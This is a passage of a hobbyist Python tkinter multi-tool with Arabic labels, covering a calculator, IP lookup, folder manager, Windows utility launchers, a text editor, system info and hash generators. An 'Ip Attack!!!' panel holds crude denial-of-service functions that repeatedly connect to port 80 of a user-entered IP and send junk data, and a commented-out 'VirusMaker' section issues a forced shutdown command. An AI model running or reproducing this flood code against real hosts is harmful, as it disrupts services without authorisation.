          ,width=3,command=lambda :btnclick("-"))

##############################################
################------------##################
##############################################
btmins2=Button(fm1
              ,text='-'
              ,bg='Gray'
              ,fg='yellow'
              ,bd=12
              ,font=('times',17,'bold'),
              activebackground='Gray',
              activeforeground='Gray',
              height=0,
              width=3,
              command=lambda :btnclick("-"))

##############################################
################xxxxxxxxxxxx##################
##############################################
btmult2=Button(fm1,
              text='log2',
              bg='Gray',
              fg='yellow',
              bd=12,
              font=('times',17,'bold'),
              activebackground='Gray',
              activeforeground='Gray',
              height=0
              ,width=3,
              command=lambda :btnclick("log2("))

#############################################
################///////////////##################
##############################################
btdiv2=Button(fm1,
             text='sinh',
             bg='Gray',
             fg='yellow',
             bd=12,
             font=('times',17,'bold'),
             activebackground='Gray',
             activeforeground='Gray',
             height=0
             ,width=3,
             command=lambda :btnclick("sinh("))

#-----------------------------------------------------------------------------------------------------------------------#
AC_2=Button(fm1,
          text='AC',
          bg='Gray',
          fg='white',
          bd=12,
          font=('times',17,'bold'),
          activebackground='Gray',
          activeforeground='Gray',
          height=0
          ,width=4,
          command=AC)

#############################################
#This Part For Sum Button
#############################################
__sum=Button(fm1,
            text='=',
            bg='Gray',
            fg='black',
            bd=12,
            font=('times',17,'bold'),
            activebackground='Gray',
            activeforeground='Gray',
            height=5,
            width=3
            ,command=sum_22)

#############################################
#This Part For Number Button
#############################################
num1_2=Button(fm1,
            text='1',
            bg='Gray',
            fg='black',
            bd=13,
            font=('times',17,'bold'),
            activebackground='Gray',
            activeforeground='Gray',
            height=0,
            width=3
            ,command=lambda :btnclick(1))




num2_2=Button(fm1,
            text='2',
            bg='Gray'
            ,fg='black',
            bd=13
            ,font=('times',17,'bold'),
            activebackground='Gray',
            activeforeground='Gray',
            height=0,
            width=3
            ,command=lambda :btnclick(2))



num3_2=Button(fm1,
            text='3',
            bg='Gray',
            fg='black'
            ,bd=13,
            font=('times',17,'bold'),
            activebackground='Gray',
            activeforeground='Gray',
            height=0,
            width=3,
            command=lambda :btnclick(3))





num4_2=Button(fm1,
            text='4',
            bg='Gray',
            fg='black',
            bd=13,
            font=('times',17,'bold'),
            activebackground='Gray',
            activeforeground='Gray',
            height=0,
            width=3,
            command=lambda :btnclick(4))






num5_2=Button(fm1
            ,text='5'
            ,bg='Gray'
            ,fg='black'
            ,bd=13
            ,font=('times',17,'bold'),
            activebackground='Gray',
            activeforeground='Gray'
            ,height=0,width=3,
            command=lambda :btnclick(5))



num6_2=Button(fm1,text='6',
           bg='Gray',
           fg='black',
           bd=13
           ,font=('times',17,'bold'),
           activebackground='Gray',
           activeforeground='Gray',
           height=0,
           width=3,
           command=lambda :btnclick(6))


num7_2=Button(fm1,text='7',
           bg='Gray',
           fg='black',
           bd=13,
           font=('times',17,'bold'),
           activebackground='Gray',
           activeforeground='Gray',
           height=0,
           width=3,
           command=lambda :btnclick(7))



num8_2=Button(fm1,text='8',
           bg='Gray',
           fg='black'
           ,bd=13,
           font=('times',17,'bold'),
           activebackground='Gray',
           activeforeground='Gray',
           height=0,
           width=3,
           command=lambda :btnclick(8))


num9_2=Button(fm1,
           text='9',
           bg='Gray',
           fg='black',
           bd=13,
           font=('times',17,'bold'),
           activebackground='Gray',
           activeforeground='Gray',
           height=0,
           width=3,
           command=lambda :btnclick(9))



nm0_2=Button(fm1
           ,text='0'
           ,bg='Gray'
           ,fg='black'
           ,bd=13
           ,font=('times',17,'bold'),
           activebackground='Gray',
           activeforeground='Gray'
           ,height=0,width=3,
           command=lambda :btnclick(0))


nmdot_2=Button(fm1
           ,text='.'
           ,bg='Gray'
           ,fg='yellow'
           ,bd=13
           ,font=('times',17,'bold'),
           activebackground='Gray',
           activeforeground='Gray'
           ,height=0
           ,width=3,
           command=lambda :btnclick('.'))
nmWa_2=Button(fm1
           ,text=','
           ,bg='Gray'
           ,fg='yellow'
           ,bd=13
           ,font=('times',17,'bold'),
           activebackground='Gray',
           activeforeground='Gray'
           ,height=0
           ,width=3,
           command=lambda :btnclick(','))





############################################
#This part for Radiobutton ^_^
############################################
rd1=Radiobutton(fm1,bg='Indigo',fg='Red',activebackground='Indigo',activeforeground='Red',
                text='Standard',command=Standard)
rd1.place(x=595,y=73)
############################
rd2=Radiobutton(fm1,bg='Indigo',fg='Red',activebackground='Indigo',activeforeground='Red',
                text='Scientific',command=Scientific)
rd2.place(x=480,y=73)
############################################
#This part for Entry & var
############################################

#=========================================================================================================================#
#===================================================Ip Grapper v.4========================================================#
#=========================================================================================================================#
Hack1=StringVar()
Hack2=StringVar()
def Ipv4():
    x=gethostbyname(Hack1.get())
    Hack2.set(x)
    
class MM_IP_Grapper(tkinter.Entry):
    
    def __init__(self,perant,*args,**kwargs):
        tkinter.Entry.__init__(self,perant,*args,**kwargs)
        self.popup_menu=tkinter.Menu(self,tearoff=0)
        self.popup_menu.add_command(label="Cut                      ",command=self.Cut)
        self.popup_menu.add_command(label="Copy                      ",command=self.Copy)
        self.popup_menu.add_command(label="Paste                      ",command=self.Paste)
        self.popup_menu.add_separator()
        self.popup_menu.add_command(label="Select all",command=self.select_all)
        self.popup_menu.add_command(label="Delete",command=self.delete_selected)
        self.bind('<Button-3>',self.popup)

    def popup(self, event):
        try:
            self.popup_menu.tk_popup(event.x_root, event.y_root, 0)
        finally:
            self.popup_menu.grab_release()

    def Copy(self):
        self.event_generate('<<Copy>>')
    
    def Paste(self):
        self.event_generate('<<Paste>>')

    def Cut(self):
        self.event_generate('<<Cut>>')
        
    def delete_selected(self):
        self.event_generate('<Delete>')

    def select_all(self):
        self.event_generate('<Control-a>')


lbip=Label(fm3,text='Ip Grapper.v4',bg='Indigo',fg='yellow',bd=6,relief='groove'
           ,font=('arial','23','bold'))
lbip.pack()
lburl=Label(fm3,text='URL',bg='Indigo',fg='Yellow',bd=6,relief='groove'
            ,font=('arial','19','bold'))
lburl.place(x=80,y=108)
entip=MM_IP_Grapper(fm3,bg='Indigo',width=41,fg='yellow',bd=6
            ,font=('arial','15','bold'),
            cursor='arrow',textvariable=Hack1,selectbackground='Blue')
entip.place(x=155,y=110)

btip=Button(fm3,bg='Gray',text='Get',width=5,fg='yellow',bd=8,activebackground='Gray'
            ,font=('arial','15','bold'),command=Ipv4)
btip.place(x=310,y=170)
lbipGet=Label(fm3,text='Ip',bg='Indigo',fg='red',bd=6,relief='groove'
              ,font=('arial','22','bold'))
lbipGet.place(x=95,y=232)

entip2=MM_IP_Grapper(fm3,bg='Indigo',width=41,fg='yellow',bd=6
             ,font=('arial','15','bold')
             ,cursor='arrow',textvariable=Hack2,selectbackground='Blue')
entip2.place(x=155,y=240)
#=========================================================================================================================#
#===================================================Ip Attack!!!==========================================================#
#=========================================================================================================================#
At1=StringVar()
At2=StringVar()

def DosAttack():
    while True:
        ip=At1.get()
        port=80
        s=socket(AF_INET,SOCK_STREAM)
        con=s.connect((ip,port))
        data='IKUGFWEERGFNDSLFGQERPQHYFGHKSFDNJEWORJLEQWHRLGEWKLFGLKHDRTHYEWLTRJEJFDHFG'
        s.send(data.encode("utf-8"))
        for i in range(10000000000000000000):
            print('Access Filed...',ip,'Port 80',i)
        

def DDosAttack():
    while True:
        ip=At1.get()
        port=80
        s=socket(AF_INET,SOCK_STREAM)
        con=s.connect((ip,port))
        data='IKUGFWEERGFNDSLFGQERPQHYFGHKSFDNJEWORJLEQWHRLGEWKLFGLKHDRTHYEWLTRJEJFDHFG'
        s.send(data.encode("utf-8"))
        for i in range(10000000000000000000000):
            print('Access Filed...',ip,'Port 80',i)
def Destroywebsite():
   while True:
        ip=At1.get()
        port=80
        s=socket(AF_INET,SOCK_STREAM)
        con=s.connect((ip,port))
        data='IKUGFWEERGFNDSLFGQERPQHYFGHKSFDNJEWORJLEQWHRLGEWKLFGLKHDRTHYEWLTRJEJFDHFG'
        s.send(data.encode("utf-8"))
        for i in range(10000000000000000000):
            print('Access Filed...',ip,'Port 80',i)
#========================================================================================================================#
#========================================================================================================================#
#========================================================================================================================#
#========================================================================================================================#        
class MM_IP_Attack(tkinter.Entry):
    
    def __init__(self,perant,*args,**kwargs):
        tkinter.Entry.__init__(self,perant,*args,**kwargs)
        self.popup_menu=tkinter.Menu(self,tearoff=0)
        self.popup_menu.add_command(label="Cut                    ",command=self.Cut)
        self.popup_menu.add_command(label="Copy                   ",command=self.Copy)
        self.popup_menu.add_command(label="Paste                  ",command=self.Paste)
        self.popup_menu.add_separator()
        self.popup_menu.add_command(label="Select all  ",command=self.select_all)
        self.popup_menu.add_command(label="Delete  ",command=self.delete_selected)
        self.bind('<Button-3>',self.popup)

    def popup(self, event):
        try:
            self.popup_menu.tk_popup(event.x_root, event.y_root, 0)
        finally:
            self.popup_menu.grab_release()

    def Copy(self):
        self.event_generate('<<Copy>>')
    
    def Paste(self):
        self.event_generate('<<Paste>>')

    def Cut(self):
        self.event_generate('<<Cut>>')
                
    def delete_selected(self):
        self.event_generate('<Delete>')

    def select_all(self):
        self.event_generate('<Control-a>')


#========================================================================================================================#
#================================================This part for Design====================================================#
#========================================================================================================================#
lbat=Label(fm4,text='Attack!!!',bg='Indigo',fg='yellow',bd=6,relief='groove'
           ,font=('arial','23','bold'))
lbat.pack()
lburl=Label(fm4,text='IP',bg='Indigo',fg='yellow',bd=6,relief='groove'
            ,font=('arial','19','bold'))
lburl.place(x=110,y=108)




entat=MM_IP_Attack(fm4,bg='Indigo',width=41,fg='yellow',bd=6,textvariable=At1
            ,font=('arial','15','bold')
            ,cursor='arrow',selectbackground='Blue')
entat.place(x=150,y=110)




btat=Button(fm4,bg='Gray',text='Dos Attack',width=9,fg='dark red'
            ,bd=8,activebackground='Gray',command=DosAttack
            ,font=('times','13','bold'))
btat.place(x=400,y=180)
btat2=Button(fm4,bg='Gray',text='DDos Attack'
             ,width=9,fg='light blue',bd=8,activebackground='Gray'
             ,font=('times','13','bold'))
btat2.place(x=169,y=180)
btat3=Button(fm4,bg='Gray',text='Destroy(website)',width=20,fg='white'
             ,bd=8,activebackground='Gray',font=('times','13','bold'))
btat3.place(x=253,y=246)
#=========================================================================================================================#
#===================================================MakeFile...===========================================================#
#=========================================================================================================================#
O=StringVar()
O2=StringVar()
try:
    def Open():
        mkdir(O.get())
    def Remove():
        shutil.rmtree(O.get())
    def Clear():
        O2.set('')
        O.set('')
    def replace2():
        replace(O.get(),O2.get())
    def Ask():
        root.state('withdrawn')
        rootAsk.state('normal')
    def Ok():
        rootAsk.state('withdrawn')
        root.state('normal')
    def move():
        O2.get()
        O.set(O2.get())
    def move2():
        O.get()
        O2.set(O.get())
except Exception:
    pass
#######################################################################################################################
lbat=Label(fm5,text='MakeFile^_^',bg='Indigo',fg='yellow',bd=6,relief='groove'
           ,font=('arial','27','bold'))
lbat.place(x=230,y=6)
lburl=Label(fm5,text='إسم الملف',bg='Indigo',fg='white',bd=6,relief='groove'
            ,font=('arial','19','bold'))
lburl.place(x=30,y=108)
entat=Entry(fm5,bg='Indigo',width=39,fg='yellow',selectbackground='Blue',bd=6
            ,font=('arial','15','bold'),cursor='arrow',textvariable=O)
entat.place(x=150,y=110)
entreplace=Entry(fm5,bg='Indigo',width=20,fg='yellow',selectbackground='Blue',bd=6
                 ,font=('arial','15','bold'),cursor='arrow',textvariable=O2)
entreplace.place(x=150,y=250)
btatr=Button(fm5,bg='Gray',text='إنشاء ملف',width=9,fg='red',bd=8,activebackground='Gray'
             ,font=('times','11','bold'),command=Open)
btatr.place(x=600,y=110)
btsaveas=Button(fm5,bg='Gray',text='تنظيف الكل',width=9,fg='red',bd=8,activebackground='Gray'
                ,font=('times','11','bold'),command=Clear)
btsaveas.place(x=550,y=350)
btat=Button(fm5,bg='Gray',text='مسح المجلد',width=9,fg='yellow',bd=8,activebackground='Gray'
            ,font=('times','11','bold'),
            command=Remove)
btat.place(x=200,y=180)
btreplace=Button(fm5,bg='Gray',text='أستبدال أسم المجلد',width=13,fg='yellow',bd=8
                 ,activebackground='Gray',font=('times','11','bold'),
            command=replace2)
btreplace.place(x=5,y=250)

btmove=Button(fm5,bg='Gray',text='نقل من أسفل لأعلي',width=13,fg='yellow',bd=8
              ,activebackground='Gray',font=('times','11','bold'),
            command=move)
btmove.place(x=400,y=250)
btmove=Button(fm5,bg='Gray',text='نقل من أعلي إلي أسفل',width=13,fg='yellow',bd=8
              ,activebackground='Gray',font=('times','11','bold'),
            command=move2)
btmove.place(x=400,y=190)
lbEr=Label(fm5,text='(أكتب اسم للملف الذي تريد إنشائه)',bg='Indigo',fg='yellow'
           ,font=('airal','14','bold'))
lbEr.place(x=237,y=69)

lbask=Label(rootAsk,text='. الملف موجود مع في نفس المكان الذي فيه البرنامج ',bg='Indigo',fg='yellow',bd=6,relief='groove',font=('arial','19','bold'))
lbask.place(x=37,y=35)


btAsk=Button(fm5,bg='Gray',text='أين الملف ؟',width=9,fg='white',bd=8,activebackground='Gray'
             ,font=('times','11','bold'),
            command=Ask)
btAsk.place(x=70,y=365)
btat=Button(rootAsk,bg='Gray',text='حسناً',width=9,fg='red',bd=8,activebackground='Gray'
            ,font=('times','11','bold'),
            command=Ok)
btat.place(x=200,y=100)
#=========================================================================================================================#
#===================================================MakeVirus...==========================================================#
#=========================================================================================================================#
##CH1=StringVar()
##CH2=StringVar()
##TxVr=StringVar()
##
##
##def Shut():
##    system('shutdown -s -t 100000')
##def shut2():
##    system('shutdown -a')
##    
##
##
##
##
##
##
##Vs=Label(fm6,text='VirusMaker',bg='Indigo',fg='Yellow',bd=10,relief='ridge'
##         ,font=('arial','23','bold'))
##Vs.pack()
##
##
##check1=Checkbutton(fm6,text='قفل الجهاز',bg='Indigo',fg='Yellow',activeforeground='Indigo',
##                   font=('arial','15','bold'),
##                   command=Shut)
##check1.place(x=500,y=70)
##check2=Checkbutton(fm6,text='إيقاف غلق الجهاز',activeforeground='Indigo',bg='Indigo',fg='Yellow'
##                   ,font=('arial','15','bold'),
##                   command=shut2)
##check2.place(x=500,y=109)
#=========================================================================================================================#
#===================================================TheHelper...==========================================================#
#=========================================================================================================================#
def cmd():
    system('start cmd')
def Bluetouth():
    system('start fsquirt')
def magnify():
    system('magnify')
def Write():
    system('notepad')
def Control():
    system('control')
def Calc():
    system('calc\nexit')
def Winver():
    system('winver')
def dxdiag():
    system('dxdiag')
def osk():
    system('osk')
def regedit():
    system('regedit')
def taskmgr2():
    system('taskmgr')
def wupdmgr2():
    system('In')
#==============================================================================================#
#==============================================================================================#
HP=Label(fm7,text='TheHelper^_^',bg='Indigo',fg='red',bd=10,relief='ridge',font=('arial','23','bold'))
HP.pack()

H1=Radiobutton(fm7,text='فتح الشاشة السوداء',bg='Indigo',bd=4,activeforeground='red'
               ,activebackground='Indigo',fg='Yellow',font=('arial','15','bold')
               ,command=cmd)
H1.place(x=500,y=65)
H2=Radiobutton(fm7,text='فتح البلوتوث',activeforeground='red',bg='Indigo',activebackground='Indigo'
                       ,fg='Yellow',font=('arial','15','bold'),command=Bluetouth)
H2.place(x=500,y=102)
H3=Radiobutton(fm7,text='فتح العدسة المكبرة',bg='Indigo',activeforeground='red',activebackground='Indigo'
                       ,fg='Yellow',font=('arial','15','bold'),command=magnify)
H3.place(x=500,y=141)
H4=Radiobutton(fm7,text='فتح المفكرة',bg='Indigo',activeforeground='red',activebackground='Indigo'
                       ,fg='Yellow',font=('arial','15','bold'),command=Write)
H4.place(x=500,y=180)
H5=Radiobutton(fm7,text='Control Panal فتح',bg='Indigo',activeforeground='red',activebackground='Indigo'
                       ,fg='Yellow',font=('arial','15','bold'),command=Control)
H5.place(x=500,y=219)
H6=Radiobutton(fm7,text='فتح الألة الحاسبة',bg='Indigo',activeforeground='red',activebackground='Indigo'
                       ,fg='Yellow',font=('arial','15','bold'),command=Calc)
H6.place(x=500,y=258)
H7=Radiobutton(fm7,text='عن إصدار النسخة',bg='Indigo',activeforeground='red',activebackground='Indigo'
                       ,fg='Yellow',font=('arial','15','bold'),command=Winver)
H7.place(x=500,y=297)
H8=Radiobutton(fm7,text='DirectX فتح',bg='Indigo',activeforeground='red',activebackground='Indigo'
                       ,fg='Yellow',font=('arial','15','bold'),command=dxdiag)
H8.place(x=500,y=336)
H9=Radiobutton(fm7,text='فتح لوحة مفاتيح الشاشة',bg='Indigo',activeforeground='red',activebackground='Indigo'
                       ,fg='Yellow',font=('arial','15','bold'),command=osk)
H9.place(x=200,y=70)
H10=Radiobutton(fm7,text='فتح الريجيستري',bg='Indigo',activeforeground='red',activebackground='Indigo'
                       ,fg='Yellow',font=('arial','15','bold'),command=regedit)
H10.place(x=200,y=109)
H11=Radiobutton(fm7,text='فتح المتصفح',bg='Indigo',activeforeground='red',activebackground='Indigo'
                       ,fg='Yellow',font=('arial','15','bold'),command=wupdmgr2)
H11.place(x=200,y=148)

H12=Radiobutton(fm7,text='مدير حالة البرامج',bg='Indigo',activeforeground='red',activebackground='Indigo'
                       ,fg='Yellow',font=('arial','15','bold'),command=taskmgr2)
H12.place(x=200,y=187)
#==============================================================================================#
#=======================================This Part for Coders===================================#
#==============================================================================================#
##lbTxt111=Label(fm8,text='You Professional ^_^',bg='Indigo',fg='red'
##               ,bd=10,relief='ridge',font=('arial','23','bold'))
##lbTxt111.pack()


def Control_Open(event):
        f=askopenfile(mode='r',defaultextension=".py",filetypes=[("All Files","*.*"),
                                                                 ("Text Documents","*.txt"),
                                                                 ("Python File","*.py"),
                                                                 ("Movie File","*.mp4"),
                                                                 ("Ritch Text Format","*.rtf"),
                                                                 ("Batch File","*.bat"),
                                                                 ("HTML File","*.html"),
                                                                 ("HTML File","*.htm"),
                                                                 ("PHP FILE","*.php"),
                                                                 ("JavaScript File","*.js"),
                                                                 ("Excetuble File","*.exe"),
                                                                 ("Zip File","*.zip"),
                                                                 ("Rar archive","*.rar"),
                                                                 ("PDF File","*.pdf"),
                                                                 ("ISO","*.iso"),
                                                                 ("Visual Basic File","*.vb"),
                                                                 ("C++ File","*.cpp"),
                                                                 ("Java File","*.java"),
                                                                 ("DLL File","*.dll"),
                                                                 ("Perl File","*.pl")])
        t=f.read()
        TXT.delete(0.0,END)
        TXT.insert(0.0,t)
        ntb.select(7)
def openfile():
        f=askopenfile(mode='r',defaultextension=".py",filetypes=[("All Files","*.*"),
                                                                 ("Text Documents","*.txt"),
                                                                 ("Python File","*.py"),
                                                                 ("Movie File","*.mp4"),
                                                                 ("Ritch Text Format","*.rtf"),
                                                                 ("Batch File","*.bat"),
                                                                 ("HTML File","*.html"),
                                                                 ("HTML File","*.htm"),
                                                                 ("PHP FILE","*.php"),
                                                                 ("JavaScript File","*.js"),
                                                                 ("Excetuble File","*.exe"),
                                                                 ("Zip File","*.zip"),
                                                                 ("Rar archive","*.rar"),
                                                                 ("PDF File","*.pdf"),
                                                                 ("ISO","*.iso"),
                                                                 ("Visual Basic File","*.vb"),
                                                                 ("C++ File","*.cpp"),
                                                                 ("Java File","*.java"),
                                                                 ("DLL File","*.dll"),
                                                                 ("Perl File","*.pl")])
        t=f.read()
        TXT.delete(0.0,END)
        TXT.insert(0.0,t)
        ntb.select(7)
def Cotrol_S_Saveas(event):
        f=asksaveasfile(mode='w',initialfile='Untitled.txt',
                        defaultextension=".py",
                        filetypes=[("All Files","*.*"),
                                  ("Text Documents","*.txt"),
                                  ("Python File","*.py"),
                                  ("Movie File","*.mp4"),
                                  ("Ritch Text Format","*.rtf"),
                                  ("Batch File","*.bat"),
                                  ("HTML File","*.html"),
                                  ("HTML File","*.htm"),
                                  ("PHP File","*.php"),
                                  ("JavaScript File","*.js"),
                                  ("Excetuble File","*.exe"),
                                  ("Zip File","*.zip"),
                                  ("Rar archive","*.rar"),
                                  ("PDF File","*.pdf"),
                                  ("ISO File","*.iso"),
                                  ("Visual Basic File","*.vb"),
                                  ("C++ File","*.cpp"),
                                  ("Java File","*.java"),
                                  ("DLL File","*.dll"),
                                  ("Perl File","*.pl")])
        t=TXT.get(0.0,END)
        try:
            f.write(t.rstrip())
        except:
            showerror(title='Oops',message='Sorry can\'t save the file')
def saveasfile():
        f=asksaveasfile(mode='w',initialfile='Untitled.txt',
                        defaultextension=".py",
                        filetypes=[("All Files","*.*"),
                                  ("Text Documents","*.txt"),
                                  ("Python File","*.py"),
                                  ("Movie File","*.mp4"),
                                  ("Ritch Text Format","*.rtf"),
                                  ("Batch File","*.bat"),
                                  ("HTML File","*.html"),
                                  ("HTML File","*.htm"),
                                  ("PHP File","*.php"),
                                  ("JavaScript File","*.js"),
                                  ("Excetuble File","*.exe"),
                                  ("Zip File","*.zip"),
                                  ("Rar archive","*.rar"),
                                  ("PDF File","*.pdf"),
                                  ("ISO File","*.iso"),
                                  ("Visual Basic File","*.vb"),
                                  ("C++ File","*.cpp"),
                                  ("Java File","*.java"),
                                  ("DLL File","*.dll"),
                                  ("Perl File","*.pl")])
        t=TXT.get(0.0,END)
        try:
            f.write(t.rstrip())
        except:
            showerror(title='Oops',message='Sorry can\'t save the file')

new_file_icon = PhotoImage(file='icons/new_file.gif')
open_file_icon = PhotoImage(file='icons/open_file.gif')
save_file_icon = PhotoImage(file='icons/save.gif')



#-----------------------------------
btnOpenTxt=Button(fm8,text='Open',height=32,width=32,bg='Indigo',fg='Yellow',bd=8,activebackground='Indigo'
                  ,activeforeground='Yellow',font=('arial','30'),image=open_file_icon,command=openfile)
btnOpenTxt.place(x=80,y=30)
#-----------------------------------
btnSaveasFile=Button(fm8,text='Save as',height=32,width=32,bg='Indigo',fg='Yellow',bd=8,activebackground='Indigo'
                  ,activeforeground='Yellow',font=('arial','30'),image=save_file_icon,command=saveasfile)
btnSaveasFile.place(x=170,y=30)
#-----------------------------------
##btnSelectall=Button(fm8,text='Save as',bg='Indigo',fg='Yellow',bd=8,activebackground='Gray'
##                  ,activeforeground='Yellow',font=('arial','9'),command=select_all)
##btnSelectall.place(x=150,y=30)
class MM_Text(tkinter.Text):
    def __init__(self,perant,*args,**kwargs):
        tkinter.Text.__init__(self,perant,*args,**kwargs)
        self.popup_menu=tkinter.Menu(self,tearoff=0)
        self.popup_menu.add_command(label="Cut                     ",command=self.Cut)
        self.popup_menu.add_command(label="Copy                    ",command=self.Copy)
        self.popup_menu.add_command(label="Paste                   ",command=self.Paste)
        self.popup_menu.add_separator()
        self.popup_menu.add_command(label="Select all              ",command=self.select_all)
        self.popup_menu.add_command(label="Delete                  ",command=self.delete_selected)
        self.bind('<Button-3>',self.popup)

    def popup(self, event):
        try:
            self.popup_menu.tk_popup(event.x_root, event.y_root, 0)
        finally:
            self.popup_menu.grab_release()

    def Copy(self):
        self.event_generate('<<Copy>>')
    
    def Paste(self):
        self.event_generate('<<Paste>>')

    def Cut(self):
        self.event_generate('<<Cut>>')
        
    def delete_selected(self):
        self.event_generate('<Delete>')

    def select_all(self):
        self.event_generate('<Control-a>')




TXT=MM_Text(fm8,
         font=('Courier','10','bold'),bg='Gray',
         fg='Yellow',
         highlightbackground='red',
         insertbackground='red',
         insertwidth=8,
         insertborderwidth=8,
         insertontime=950,
         padx=35,
         pady=35,
         relief='groove',bd=9,height=19,width=64)
TXT.place(x=58,y=78)

#-----------------------------------
sb=Scrollbar(fm8)
#-----------------------------------

#-------------------------------
sb.pack(side=RIGHT,fill=Y)
sb.config(command=TXT.yview)
TXT.config(yscrollcommand=sb.set)







# self.__thisScrollBar.pack(side=RIGHT,fill=Y)
# self.__thisScrollBar.config(command=self.__thisTextArea.yview)
# self.__thisTextArea.config(yscrollcommand=self.__thisScrollBar.set)
    
##HP=Label(fm7,text='TheHelper^_^',bg='Indigo',fg='red',bd=10,relief='ridge',font=('arial','23','bold'))
##HP.pack()

#Courier
################################################################
################################################################
################################################################
var123=StringVar()
var12345=StringVar()
var123456=StringVar()
var5=StringVar()

class MM_INFO_ENT(tkinter.Entry):
    def __init__(self,perant,*args,**kwargs):
        tkinter.Entry.__init__(self,perant,*args,**kwargs)
        self.popup_menu=tkinter.Menu(self,tearoff=0)
        self.popup_menu.add_command(label="Cut                     ",command=self.Cut)
        self.popup_menu.add_command(label="Copy                    ",command=self.Copy)
        self.popup_menu.add_command(label="Paste                   ",command=self.Paste)
        self.popup_menu.add_separator()
        self.popup_menu.add_command(label="Select all              ",command=self.select_all)
        self.popup_menu.add_command(label="Delete                  ",command=self.delete_selected)
        self.bind('<Button-3>',self.popup)

    def popup(self, event):
        try:
            self.popup_menu.tk_popup(event.x_root, event.y_root, 0)
        finally:
            self.popup_menu.grab_release()

    def Copy(self):
        self.event_generate('<<Copy>>')
    
    def Paste(self):
        self.event_generate('<<Paste>>')

    def Cut(self):
        self.event_generate('<<Cut>>')
        
    def delete_selected(self):
        self.event_generate('<Delete>')

    def select_all(self):
        self.event_generate('<Control-a>')





def G():
    root4.state('withdrawn')
    root.state('normal')


def InfoMachine():
    var123.set(platform.node())
    x=gethostname()
    y=gethostbyname(x)
    var12345.set(y)
    var123456.set(platform.processor())
    var5.set(platform.system())
    
    
##except Exception:
##    print('Exist Erorr !!! \/_\/')
#################################################################
H='''
أجلب المعلومات
'''
btjj2=Button(fm6,text=H,bg='Gray',fg='Yellow',activebackground='Gray'
              ,activeforeground='Yellow',bd=10,command=InfoMachine,height=4,font=('arial','14','bold'))
btjj2.place(x=300,y=310)
#################################################################
lbOne1=Label(fm6,text='أسم الجهاز',bg='Indigo',fg='Yellow',bd=5,relief='groove'
             ,font=('arial','15','bold'))
lbOne1.place(x=232,y=68)
#------------------------
entOne14634=MM_INFO_ENT(fm6,bg='Gray',fg='white',bd=5,selectbackground='Blue'
             ,selectforeground='Yellow',font=('arial','10','bold')
              ,textvariable=var123)
entOne14634.place(x=330,y=70)
#------------------------
lbTwo2=Label(fm6,text='أي بي الجهاز',bg='Indigo',fg='Yellow',bd=5,relief='groove'
             ,font=('arial','15','bold'))
lbTwo2.place(x=218,y=126)
#------------------------
entTwo2626345243=MM_INFO_ENT(fm6,bg='Gray',fg='white',bd=5,selectbackground='dark red'
             ,selectforeground='Yellow',font=('arial','10','bold')
              ,textvariable=var12345)
entTwo2626345243.place(x=330,y=128)
#------------------------
lbTree3457573476=Label(fm6,text='معلومات حول البروسيسور',bg='Indigo',fg='Yellow',bd=5,relief='groove'
             ,font=('arial','15','bold'))
lbTree3457573476.place(x=100,y=178)
#------------------------
entTree3=MM_INFO_ENT(fm6,bg='Gray',fg='white',bd=5,selectbackground='dark green'
             ,selectforeground='Yellow',font=('arial','10','bold'),width=50
               ,textvariable=var123456)
entTree3.place(x=300,y=180)
#------------------------
lbTree565575=Label(fm6,text='نظام التشغيل',bg='Indigo',fg='Yellow',bd=5,relief='groove'
             ,font=('arial','15','bold'))
lbTree565575.place(x=198,y=238)
#------------------------
entTree456=MM_INFO_ENT(fm6,bg='Gray',fg='white',bd=5,selectbackground='Indigo'
             ,selectforeground='Yellow',font=('arial','10','bold'),width=30
               ,textvariable=var5)
entTree456.place(x=300,y=238)
########################################################################
class MM(tkinter.Entry):
    
    def __init__(self,perant,*args,**kwargs):
        tkinter.Entry.__init__(self,perant,*args,**kwargs)
        self.popup_menu=tkinter.Menu(self,tearoff=0)
        self.popup_menu.add_command(label="Cut                    ",command=self.Cut)
        self.popup_menu.add_command(label="Copy                   ",command=self.Copy)
        self.popup_menu.add_command(label="Paste                   ",command=self.Paste)
        self.popup_menu.add_separator()
        self.popup_menu.add_command(label="Select all",command=self.select_all)
        self.popup_menu.add_command(label="Delete",command=self.delete_selected)
        self.bind('<Button-3>',self.popup)

    def popup(self, event):
        try:
            self.popup_menu.tk_popup(event.x_root, event.y_root, 0)
        finally:
            self.popup_menu.grab_release()

    def Copy(self):
        self.event_generate('<<Copy>>')
    
    def Paste(self):
        self.event_generate('<<Paste>>')

    def Cut(self):
        self.event_generate('<<Cut>>')

    def delete_selected(self):
           self.event_generate('<Delete>')

    def select_all(self):
        self.event_generate('<Control-a>')




#===========================================================================================================================
#==============================================التشفير======================================================================
#===========================================================================================================================
cry1=StringVar()
cry2=StringVar()
try:
    def md5():
        x=hashlib.md5(cry1.get().encode()).hexdigest() # local var in for(def)
        cry2.set(x)
    def sha1():
        x=hashlib.sha1(cry1.get().encode()).hexdigest()
        cry2.set(x)
    def sha224():
        x=hashlib.sha224(cry1.get().encode()).hexdigest()
        cry2.set(x)
    def sha384():
        x=hashlib.sha384(cry1.get().encode()).hexdigest()
        cry2.set(x)
    def sha512():
        x=hashlib.sha512(cry1.get().encode()).hexdigest()
        cry2.set(x)
    def clear():
        cry1.set('')
        cry2.set('')
except Exception:
    pass
#===========================This part for main==============================#
ent5555=MM(fm2,bg='Gray',fg='Yellow',width=40
          ,selectbackground='Indigo',bd=7
          ,font=('arial','16','bold'),textvariable=cry1,insertwidth=5)
ent5555.place(x=90,y=100)
ent222222=MM(fm2,bg='Gray',fg='white',width=40
          ,selectbackground='Indigo',bd=7
          ,font=('arial','16','bold'),textvariable=cry2,insertwidth=5)
ent222222.place(x=90,y=250)
lb=Label(fm2,text='CRYPTOGRAM',bg='Indigo',fg='Yellow',bd=8,relief='groove',font=('arial','25','bold'))
lb.place(x=200,y=0)
lbHr=Label(fm2,text='(أكتب أي شئ لكل يُشفر)',bg='Indigo',fg='yellow',font=('airal','14','bold'))
lbHr.place(x=247,y=60)
#-------------------------------------------------------------------------------
bt=Button(fm2,text='md5',bg='Gray',bd=11,fg='dark red',command=md5)
bt.place(x=510,y=170)

bt2=Button(fm2,text='sha 1',bg='Gray',bd=11,fg='Yellow',activebackground='blue'
           ,font=('arial',11),command=sha1)
bt2.place(x=410,y=170)

bt3=Button(fm2,text='sha 224',bg='Gray',bd=11,fg='blue',activebackground='blue'
           ,font=('arial',11),command=sha224)
bt3.place(x=310,y=170)

bt4=Button(fm2,text='sha 384',bg='Gray',bd=11,fg='red',activebackground='Yellow'
           ,font=('arial',11),command=sha384)
bt4.place(x=210,y=170)

